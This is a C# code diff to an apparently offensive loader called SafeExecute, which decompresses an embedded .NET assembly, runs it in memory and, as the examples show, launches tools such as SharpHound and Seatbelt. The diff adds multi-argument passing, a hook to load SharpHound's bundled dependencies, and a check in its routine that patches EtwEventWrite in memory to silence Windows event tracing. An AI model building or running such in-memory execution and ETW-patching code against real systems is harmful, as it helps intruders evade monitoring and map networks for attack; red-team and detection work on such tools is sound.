@@ -6,6 +6,8 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using System.IO.Compression;
+using System.Collections.Generic;
+using System.Net;
 
 namespace SafeExecute
 {
@@ -31,13 +33,14 @@ namespace SafeExecute
         /// Optional Arguments
         /// 
         /// Example: SafeExecute.exe seatbelt.program main
+        /// Example: SafeExecute.exe SharpHound3.SharpHound InvokeSharpHound -h
         /// </summary>
         /// <param name="args"></param>
         public static void Main(string[] args)
         {
             string nameSpace = "";
             string methodName = "";
-            string arg = "";
+            List <string> arg = new List<string>();
             try
             {
                 if (args.Count() < 1 || args[0] == null || args[0] == "")
@@ -55,9 +58,12 @@ namespace SafeExecute
 
 
                 if (args.Count() <= 2)
-                    arg = "";
+                    arg.Add("");
                 else
-                    arg = args[2];
+                    for (int i = 2; i < args.Count(); i++)
+                    {
+                        arg.Add(args[i]);
+                    }
 
                 nameSpace = args[0];
             }
@@ -106,7 +112,7 @@ namespace SafeExecute
                 byte[] assemblyBin = deflateDecompress(decoded);
 
                 //string[] args = { @"" };
-                ExecuteTheThing(assemblyBin, nameSpace, methodName, new string[] { arg });
+                ExecuteTheThing(assemblyBin, nameSpace, methodName, arg.ToArray());
             }
             catch (Exception e)
             {
@@ -124,6 +130,16 @@ namespace SafeExecute
             {
                 Assembly assembly = Assembly.Load(bytes);
 
+                //Sphagetto addition for SharpHound
+                try
+                {
+                    MethodInfo attach = assembly.GetType("Costura.AssemblyLoader", false).GetMethod("Attach", (BindingFlags.Public | BindingFlags.Static));
+                    attach.Invoke(assembly.GetType("Costura.AssemblyLoader", false), null);
+                }
+                catch (Exception)
+                {
+                }
+
                 Type type = assembly.GetTypes().FirstOrDefault(x => x.FullName.ToLower().Equals(typeName.ToLower()));
                 if (type == null)
                 {
@@ -140,7 +156,7 @@ namespace SafeExecute
 
                 //Automatically fix the case where method expects no parameters and an empty string was given
                 ParameterInfo[] parameters = method.GetParameters();
-                method.Invoke(instance, (parameters.Count() == 0 && args[0] == "") ? null : new object[] { args });
+                method.Invoke(instance, (parameters.Count() == 0 && args[0] == "") ? null : new object[] { args } );
 
             }
             catch (Exception e)
@@ -162,6 +178,11 @@ namespace SafeExecute
                 Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
 
                 Console.WriteLine($"[+] Original value:{Marshal.ReadInt16(etwEventSend).ToString("X6")}");
+                if (Marshal.ReadInt16(etwEventSend).ToString("X6") == "0000C3")
+                {
+                    Console.WriteLine("[+] EtwEventWrite has already been patched!");
+                    return;
+                }
                 Marshal.Copy(patch, 0, etwEventSend, patch.Length);
                 Console.WriteLine($"[+] New value:{Marshal.ReadInt16(etwEventSend).ToString("X6")}");
             }
